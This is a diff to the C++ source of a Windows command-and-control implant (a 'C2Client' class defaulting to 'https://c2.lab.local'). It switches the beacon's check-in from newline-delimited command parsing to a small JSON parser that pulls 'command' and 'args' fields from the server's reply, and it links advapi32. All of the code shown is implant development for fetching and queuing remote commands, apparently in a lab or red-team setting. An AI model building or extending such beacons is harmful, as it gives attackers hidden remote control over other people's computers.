@@ -9,6 +9,7 @@
 #include <iostream>
 
 #pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "advapi32.lib")
 
 using namespace std;
 
@@ -224,6 +225,28 @@ private:
         return response;
     }
 
+    wstring extractJsonValue(const wstring &json, const wstring &key)
+    {
+        wstring pattern = L"\"" + key + L"\"";
+        size_t keyPos = json.find(pattern);
+        if (keyPos == wstring::npos)
+            return L"";
+
+        size_t colonPos = json.find(L":", keyPos);
+        if (colonPos == wstring::npos)
+            return L"";
+
+        size_t firstQuote = json.find(L"\"", colonPos + 1);
+        if (firstQuote == wstring::npos)
+            return L"";
+
+        size_t secondQuote = json.find(L"\"", firstQuote + 1);
+        if (secondQuote == wstring::npos)
+            return L"";
+
+        return json.substr(firstQuote + 1, secondQuote - firstQuote - 1);
+    }
+
 public:
     C2Client(const wstring &serverURL = L"https://c2.lab.local")
     {
@@ -339,41 +362,22 @@ public:
                 wcout << L"[C2][checkIn] httpRequest() completed, response length: " << response.length() << endl;
 #endif
 
-                // Parse newline-delimited commands
-                if (response.empty())
+                // Parse JSON command response
+                wstring command = extractJsonValue(response, L"command");
+                wstring args = extractJsonValue(response, L"args");
+
+                if (!command.empty())
                 {
-#ifdef _DEBUG
-                    wcout << L"[C2][checkIn] Empty response from server" << endl;
-#endif
-                    if (attempt < maxRetries - 1)
-                    {
-                        Sleep(5000);
-                        continue;
-                    }
-                    return commands;
+                    if (!args.empty())
+                        commands.push_back(command + L"|" + args);
+                    else
+                        commands.push_back(command);
                 }
 
 #ifdef _DEBUG
                 wcout << L"[C2][checkIn] Parsing command response..." << endl;
 #endif
 
-                // Split by newline
-                size_t pos = 0;
-                while ((pos = response.find(L'\n')) != wstring::npos)
-                {
-                    wstring cmd = response.substr(0, pos);
-                    if (!cmd.empty())
-                    {
-                        commands.push_back(cmd);
-                    }
-                    response.erase(0, pos + 1);
-                }
-
-                // Handle final command
-                if (!response.empty())
-                {
-                    commands.push_back(response);
-                }
 
 #ifdef _DEBUG
                 wcout << L"[C2][checkIn] Parsing complete, returning " << commands.size() << L" commands" << endl;
